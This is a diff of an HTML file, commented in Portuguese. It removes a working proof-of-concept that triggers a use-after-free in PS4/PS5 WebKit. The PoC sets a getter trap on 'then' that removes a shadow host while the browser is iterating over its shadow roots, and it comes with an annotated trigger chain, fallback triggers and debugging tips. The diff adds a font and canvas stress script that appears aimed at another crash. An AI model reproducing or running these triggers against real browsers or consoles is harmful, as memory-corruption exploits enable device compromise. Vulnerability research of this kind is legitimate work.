@@ -1,359 +1,40 @@
 <!DOCTYPE html>
-<!--
-  PS4/PS5 WebKit — UAF em m_inDocumentShadowRoots
-  Vulnerabilidade: Scope::flushPendingDescendantUpdates() sem ScriptDisallowedScope
-  Ref: commit 86074ba (NÃO aplicado neste build)
-
-  ═══════════════════════════════════════════════════════════════════════
-  POR QUE O POC UPSTREAM NÃO FUNCIONA NO PS4
-  ═══════════════════════════════════════════════════════════════════════
-  O PoC do commit depende de startedLoading() re-armar m_readyPromise:
-    startedLoading() upstream → cria novo ReadyPromise (unfulfilled)
-    startedLoading() PS4      → stub vazio (FIXME: Fire a "loading" event)
-
-  Sem re-arm: documentDidFinishLoading() já resolveu o promise antes
-  de qualquer flush, logo completedLoading() vira no-op (isFulfilled=true).
-
-  ═══════════════════════════════════════════════════════════════════════
-  CAMINHO ALTERNATIVO (este PoC)
-  ═══════════════════════════════════════════════════════════════════════
-  Cria o FontFaceSet LAZILY, dentro de run(), *depois* do shadow @font-face
-  já estar em Loading state no backing CSSFontFaceSet.
-
-  Constructor (FontFaceSet.cpp:71-86):
-    m_isDocumentLoaded = loadEventFinished() && !processingLoadEvent() = true
-    hasActiveFontFaces() = true  → m_readyPromise NÃO resolvido = PENDING
-
-  documentDidFinishLoading() já foi chamado antes do FontFaceSet existir
-  → nunca chamado nesta instância → único caminho de resolução:
-  completedLoading() — disparado durante o flush.
-
-  ═══════════════════════════════════════════════════════════════════════
-  CADEIA COMPLETA
-  ═══════════════════════════════════════════════════════════════════════
-
-  [1] shadow DOM criado, layout forçado:
-        getBoundingClientRect() → CSSFontFace(Ahem.woff?v=1) inicia loading
-        → CSSFontFaceSet.m_loadingCount++ → hasActiveFontFaces() = true
-        (Resposta HTTP não pode chegar dentro desta task JS → Loading persiste)
-
-  [2] document.fonts criado:
-        m_isDocumentLoaded = true, hasActiveFontFaces() = true
-        → m_readyPromise PENDING ✓
-
-  [3] fs.ready → JSPromise materializado:
-        DOMPromiseProxyWithResolveCallback::promise() cria JSC::JSPromise
-        e armazena em m_promise. SEM isso, resolve() usaria caminho lazy
-        (armazena valor, cria JSPromise já fulfilled) — sem thenable check.
-
-  [4] FontFaceSet.prototype.then getter instalado (trap):
-        JSPromise::resolve() lê .then SINCRONAMENTE para checar se o valor
-        resolvido é thenable (spec §25.6.1.3.2 step 3-5).
-
-  [5] sr.prepend(style2):
-        Altera ordem da cascata → Scope::scheduleUpdate(ContentsOrInterpretation)
-        → (StyleScope.cpp:710) documentScope().m_hasDescendantWithPendingUpdate = true
-        → timer TAMBÉM agendado (0s), mas flag já setado SINCRONAMENTE.
-
-  [6] document.body.offsetWidth → flush síncrono:
-        Document::updateLayoutIgnorePendingStylesheets()
-        → Document::resolveStyle()
-        → Scope::update() [doc scope] vê m_hasDescendantWithPendingUpdate=true
-        → Scope::flushPendingDescendantUpdates()          ← loop vulnerável
-            for (auto& sr : m_document.inDocumentShadowRoots()) {
-              sr.styleScope().flushPendingUpdate()
-              → updateActiveStyleSheets() [reset do font set do shadow]
-                → remove CSSFontFace(Ahem.woff?v=1, Loading state)
-                → CSSFontFaceSet::m_loadingCount-- → 0
-                → FontFaceSet::completedLoading()
-                   m_isDocumentLoaded=true && !isFulfilled()=true
-                   → m_readyPromise->resolve(*this)       [síncrono]
-                   → DOMPromiseProxy: m_promise existe
-                   → JSPromise::resolve(fontFaceSet)
-                   → lê fontFaceSet.then                 ← GETTER DISPARA
-                   → shadowHost.remove()
-                   → ShadowRoot removido de m_inDocumentShadowRoots
-                   → ListHashSetNode liberado (node->m_next = garbage)
-              }  ← flushPendingUpdate() retorna
-            ++iterator → lê node->m_next liberado → UAF / CRASH
--->
-<html>
-<head>
-<meta charset="utf-8">
-<title>UAF 86074ba — PS4 alt path</title>
-<style>
-  body { background: #111; color: #ccc; font-family: monospace; padding: 1em; }
-  pre  { font-size: 13px; line-height: 1.5; }
-  .ok  { color: #6f6; }
-  .err { color: #f66; }
-  .hit { color: #ff0; font-weight: bold; }
-</style>
-</head>
-<body>
-<pre id="log"></pre>
+<p>Teste main-thread canvas.</p>
 <script>
-(function () {
-"use strict";
+const canvas = document.createElement('canvas');
+canvas.width = 64;
+canvas.height = 64;
+const ctx = canvas.getContext('2d');
 
-/* ── logging ───────────────────────────────────────────────────────── */
-var logEl = document.getElementById("log");
-function L(s, cls) {
-  var line = document.createElement("span");
-  if (cls) line.className = cls;
-  line.textContent = s + "\n";
-  logEl.appendChild(line);
-  console.log(s);
-}
-
-/* ── NÃO acessar document.fonts aqui fora ──────────────────────────── */
-/* FontFaceSet deve ser criado lazily dentro de run(), após o shadow    */
-/* @font-face já estar em Loading state no backing CSSFontFaceSet.      */
-
-window.addEventListener("load", function () { setTimeout(run, 0); });
-
-/* ── helpers ────────────────────────────────────────────────────────── */
-function makeShadowFont(url) {
-  return (
-    "@font-face{font-family:'pf';src:url('" + url + "')}" +
-    ":host>span{font-family:'pf';font-size:20px;display:block}"
-  );
-}
-
-function installTrap(label, hostToRemove) {
-  Object.defineProperty(FontFace.prototype, "then", {
-    configurable: true,
-    get: function uafTrap() {
-      L("", "");
-      L("╔══════════════════════════════════════════════════════╗", "hit");
-      L("║  TRAP DISPARADO: FontFaceSet.prototype.then getter   ║", "hit");
-      L("║  Trigger: " + label, "hit");
-      L("║  Executando dentro de flushPendingDescendantUpdates() ║", "hit");
-      L("╚══════════════════════════════════════════════════════╝", "hit");
-      L("→ shadowHost.remove() libera ListHashSetNode mid-iteration", "hit");
-      hostToRemove.remove();
-      /* Retorna undefined → JSPromise trata fs como não-thenable     */
-      /* → resolve normalmente, sem re-entrância infinita.             */
-      return undefined;
+if (ctx) {
+    // 1. Pressiona o cache criando entradas variadas
+    const heldContexts = [];
+    for (let i = 0; i < 600; i++) {
+        const c = document.createElement('canvas');
+        c.width = 4;
+        c.height = 4;
+        const g = c.getContext('2d');
+        if (!g) break;
+        g.font = (10 + (i % 20)) + 'px "f' + i + '", sans-serif';
+        g.measureText('\u13A0\u13A2\u13A4');
+        if (i % 3 !== 0) heldContexts.push(g);
     }
-  });
+
+    // 2. Registra FontFaces e dispara medi��es intercalando mudan�as em document.fonts
+    const url = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
+    const faces = [];
+    for (let i = 0; i < 8; i++) {
+        const f1 = new FontFace('mDonor' + i, url);
+        const f2 = new FontFace('mTarget' + i, url, { unicodeRange: 'U+13A0-13FF' });
+        if (document.fonts && document.fonts.add) {
+            document.fonts.add(f1);
+            document.fonts.add(f2);
+        }
+        faces.push(f1, f2);
+        ctx.font = '12px mDonor' + i + ', mTarget' + i + ', sans-serif';
+        for (let k = 0; k < 50; k++) {
+            ctx.measureText('\u13A0\u13A2\u13A4');
+        }
+    }
 }
-
-function removeTrap() {
-  try { delete FontFace.prototype.then; } catch(e) {}
-}
-
-/* ── main ───────────────────────────────────────────────────────────── */
-function run() {
-  L("=== run() — após load event + setTimeout(0) ===");
-  L("    loadEventFinished: esperado=true, processingLoadEvent: esperado=false");
-  L("");
-
-  /* ── shadow "preamble" ──────────────────────────────────────────────
-     Elemento ANTES do nosso sr em m_inDocumentShadowRoots.
-     Garante que a iteração chega ao nosso sr antes de terminar,
-     e que o predecessor existe no linked list (ListHashSetNode chain). */
-  var pre = document.createElement("div");
-  document.body.appendChild(pre);
-  pre.attachShadow({ mode: "open" });
-
-  /* ── shadow alvo ─────────────────────────────────────────────────── */
-  var shadowHost = document.createElement("div");
-  document.body.appendChild(shadowHost);
-  var sr = shadowHost.attachShadow({ mode: "open" });
-
-  /* style1: @font-face com src ?v=1 → CSSFontFace distinto de ?v=2.
-     O servidor serve Ahem.woff para ambas URLs (query params ignorados).
-     ?v=1 garante URL nunca vista antes → cache miss → request fresco. */
-  var style1 = document.createElement("style");
-  style1.textContent = makeShadowFont("resources/Ahem.woff?v=1");
-  sr.appendChild(style1);
-
-  var span = document.createElement("span");
-  span.textContent = "X";
-  sr.appendChild(span);
-
-  /* ── shadow "successor" ─────────────────────────────────────────────
-     Elemento DEPOIS do nosso sr em m_inDocumentShadowRoots.
-     Quando ++iterator avança após processar sr (já liberado), tenta
-     ler node->m_next da memória liberada → UAF mais confiável.         */
-  var suf = document.createElement("div");
-  document.body.appendChild(suf);
-  suf.attachShadow({ mode: "open" });
-
-  /* ═══ [1] Forçar layout → @font-face entra em Loading state ════════ */
-  /* getBoundingClientRect() → layout síncrono completo do shadow DOM   */
-  /* → texto no span usa 'pf' → WebKit chama CSSFontFace::load()       */
-  /* → HTTP request para Ahem.woff?v=1 enviado (assíncrono)            */
-  /* → CSSFontFace.status = Loading                                     */
-  /* → CSSFontFaceSet.m_loadingCount++  →  hasActiveFontFaces() = true  */
-  /*                                                                     */
-  /* A resposta HTTP não pode chegar dentro desta task JS (single-thread).*/
-  /* Loading state persiste por TODA a execução síncrona de run().      */
-  void shadowHost.getBoundingClientRect();
-  L("[1] layout forçado — 'pf' (Ahem.woff?v=1) em Loading state", "ok");
-
-  /* ═══ [2] Criar FontFaceSet com promise PENDING ════════════════════ */
-  /* Primeiro acesso a document.fonts → constructor (FontFaceSet.cpp:71-86):
-       m_isDocumentLoaded = loadEventFinished() && !processingLoadEvent()
-                          = true  (setTimeout após load event)
-       hasActiveFontFaces() = true  ('pf' ainda Loading)
-       → condição "m_isDocumentLoaded && !hasActiveFontFaces()" = FALSE
-       → m_readyPromise NÃO resolvido  →  promise permanece PENDING ✓
-
-     documentDidFinishLoading() já foi chamado ANTES do FontFaceSet
-     existir → nunca chamado nesta instância. Único caminho de resolução:
-     completedLoading() — nosso trigger.                                 */
-  var fs = document.fonts;
-  L("[2] FontFaceSet criado — document.fonts.status = " + fs.status,
-    fs.status === "loading" ? "ok" : "err");
-
-  if (fs.status !== "loading") {
-    L("", "");
-    L("╔═════════════════════════════════════════════════════════╗", "err");
-    L("║  ABORT — promise já resolvido no constructor            ║", "err");
-    L("╠═════════════════════════════════════════════════════════╣", "err");
-    L("║  hasActiveFontFaces() era false quando o FontFaceSet    ║", "err");
-    L("║  foi criado. Possíveis causas:                          ║", "err");
-    L("║                                                         ║", "err");
-    L("║  A) Ahem.woff?v=1 completou antes do constructor rodar ║", "err");
-    L("║     → aumentar tamanho da fonte ou adicionar delay      ║", "err");
-    L("║        no servidor HTTP (ex: sleep 100ms antes de       ║", "err");
-    L("║        responder requests de .woff)                     ║", "err");
-    L("║                                                         ║", "err");
-    L("║  B) @font-face não foi aplicado ao span (layout bug)    ║", "err");
-    L("║     → verificar se getBoundingClientRect() realmente    ║", "err");
-    L("║        causou layout do shadow DOM                      ║", "err");
-    L("║                                                         ║", "err");
-    L("║  C) CSSFontFace não entrou em Loading (lazy load)       ║", "err");
-    L("║     → tentar document.fonts.load('20px pf') antes de   ║", "err");
-    L("║        acessar document.fonts (atenção: isso cria o     ║", "err");
-    L("║        FontFaceSet, ajustar ordem dos passos)           ║", "err");
-    L("╚═════════════════════════════════════════════════════════╝", "err");
-    return;
-  }
-
-  /* ═══ [3] Materializar o JSPromise ════════════════════════════════ */
-  /* fs.ready → DOMPromiseProxyWithResolveCallback::promise()          */
-  /*          → cria JSC::JSPromise e armazena em m_promise            */
-  /*                                                                   */
-  /* SEM materialização:                                               */
-  /*   m_readyPromise->resolve() → m_promise == null → caminho lazy:  */
-  /*   armazena valor resolvido, m_isFulfilled=true. Quando .ready     */
-  /*   é acessado depois, cria JSPromise já fulfilled → sem thenable.  */
-  /*                                                                   */
-  /* COM materialização:                                               */
-  /*   m_readyPromise->resolve() → m_promise != null → JSPromise::    */
-  /*   resolve(toJS(fontFaceSet)) → thenable check → getter dispara.  */
-  void fs.ready;
-  L("[3] JSPromise materializado via fs.ready (pending)", "ok");
-
-  /* ═══ [4] Instalar trap ANTES do prepend ══════════════════════════ */
-  /* Instalado antes de enfileirar o pending update para cobrir o caso */
-  /* (improvável) de WebKit fazer flush síncrono durante o prepend.    */
-  /*                                                                   */
-  /* O getter é invocado SINCRONAMENTE por JSPromise::resolve() ao     */
-  /* checar se o valor resolvido é thenable (spec §25.6.1.3.2):        */
-  /*   Let then be Get(resolution, "then")  ← leitura síncrona        */
-  /* Mesmo que a eventual chamada .then() seja async (microtask),      */
-  /* a LEITURA da propriedade — que dispara o getter — é síncrona.     */
-  installTrap("offsetWidth (primário)", shadowHost);
-  L("[4] Trap FontFaceSet.prototype.then instalado", "ok");
-
-  /* ═══ [5] Enfileirar mudança de stylesheet ════════════════════════ */
-  /* sr.prepend(style2) → Scope::scheduleUpdate(ContentsOrInterpretation)
-       → StyleScope.cpp:710:
-           if (m_shadowRoot)
-               documentScope().m_hasDescendantWithPendingUpdate = true;
-                                                       ↑ SÍNCRONO
-       → m_pendingUpdateTimer.startOneShot(0_s)  (timer também agendado,
-         mas o flag já está setado antes do próximo flush)              */
-  var style2 = document.createElement("style");
-  style2.textContent = makeShadowFont("resources/Ahem.woff?v=2");
-  sr.prepend(style2);  // ← URL diferente: ?v=2 → novo CSSFontFace no flush
-  L("[5] style2 (?v=2) prepended →  m_hasDescendantWithPendingUpdate=true", "ok");
-
-  /* ═══ [6] Trigger primário: flush via offsetWidth ════════════════ */
-  /*                                                                  */
-  /* document.body.offsetWidth                                        */
-  /*   → HTMLElement::offsetWidth()                                   */
-  /*   → Document::updateLayoutIgnorePendingStylesheets()             */
-  /*   → Document::resolveStyle()                                     */
-  /*   → Scope::update() [document scope]                            */
-  /*      vê m_hasDescendantWithPendingUpdate=true                    */
-  /*      → Scope::flushPendingDescendantUpdates()   ← loop          */
-  /*                                                                  */
-  /*          for (auto& sr : m_document.inDocumentShadowRoots()) {  */
-  /*            sr.styleScope().flushPendingUpdate()                  */
-  /*            → updateActiveStyleSheets() [ContentsOrInterpretation]*/
-  /*            → reset do font set do shadow:                        */
-  /*               remove CSSFontFace(Ahem.woff?v=1, Loading)        */
-  /*               → CSSFontFaceSet::m_loadingCount-- → 0            */
-  /*               → FontFaceSet::completedLoading()                  */
-  /*                  m_isDocumentLoaded=true ✓                       */
-  /*                  !isFulfilled()=true ✓                           */
-  /*                  → m_readyPromise->resolve(*this) [síncrono]    */
-  /*                  → DOMPromiseProxy: m_promise != null            */
-  /*                  → JSPromise::resolve(toJS(fontFaceSet))         */
-  /*                  → Get(fontFaceSet, "then")  ← GETTER DISPARA   */
-  /*                  → shadowHost.remove()                           */
-  /*                     → ShadowRoot removido de                     */
-  /*                        m_inDocumentShadowRoots                   */
-  /*                     → ListHashSetNode liberado                   */
-  /*          }  ← flushPendingUpdate() retorna                       */
-  /*          ++iterator → lê node->m_next liberado  → UAF / CRASH   */
-  L("[6] Trigger primário: document.body.offsetWidth ...", "ok");
-  void document.body.offsetWidth; /* ← UAF / CRASH esperado aqui */
-
-  /* ════════════════════════════════════════════════════════════════ */
-  /* Pós-flush: triggers de fallback                                 */
-  /* Se chegou aqui, o flush primário não tomou o caminho esperado. */
-  /* Possíveis razões:                                               */
-  /*   - flushPendingDescendantUpdates() não foi chamado via offsetW */
-  /*   - updateActiveStyleSheets() não removeu o CSSFontFace        */
-  /*   - completedLoading() não foi chamado (count não chegou a 0)   */
-  /* ════════════════════════════════════════════════════════════════ */
-  L("--- sem crash via offsetWidth ---", "err");
-  removeTrap();
-
-  /* ── Trigger secundário: styleSheets.length ─────────────────────── */
-  installTrap("styleSheets.length (secundário)", shadowHost);
-  L("[6b] Trigger secundário: document.styleSheets.length ...");
-  void document.styleSheets.length;
-  L("sem crash via styleSheets.length", "err");
-  removeTrap();
-
-  /* ── Trigger terciário: getComputedStyle ────────────────────────── */
-  installTrap("getComputedStyle (terciário)", shadowHost);
-  L("[6c] Trigger terciário: getComputedStyle(span) ...");
-  try { void window.getComputedStyle(span).fontFamily; } catch (e) {}
-  L("sem crash via getComputedStyle", "err");
-  removeTrap();
-
-  /* ── Trigger quaternário: forçar recalc explícito no shadow ─────── */
-  installTrap("shadowHost.offsetWidth (quaternário)", shadowHost);
-  L("[6d] Trigger quaternário: shadowHost.offsetWidth ...");
-  void shadowHost.offsetWidth;
-  L("sem crash via shadowHost.offsetWidth", "err");
-  removeTrap();
-
-  L("");
-  L("╔═══════════════════════════════════════════════════════╗", "err");
-  L("║  PoC não crashou — revisar caminho do flush           ║", "err");
-  L("╠═══════════════════════════════════════════════════════╣", "err");
-  L("║  Pontos de debug sugeridos:                           ║", "err");
-  L("║  1. Confirmar que flushPendingDescendantUpdates()     ║", "err");
-  L("║     é chamado (breakpoint em StyleScope.cpp:674)      ║", "err");
-  L("║  2. Confirmar que updateActiveStyleSheets() remove    ║", "err");
-  L("║     o CSSFontFace(Ahem.woff?v=1) de Loading state    ║", "err");
-  L("║  3. Confirmar que m_loadingCount chega a 0 e          ║", "err");
-  L("║     completedLoading() é chamado                      ║", "err");
-  L("║  4. Confirmar que m_promise != null quando            ║", "err");
-  L("║     m_readyPromise->resolve() roda                    ║", "err");
-  L("╚═══════════════════════════════════════════════════════╝", "err");
-  L("document.fonts.status final = " + fs.status);
-}
-
-})();
 </script>
-</body>
-</html>
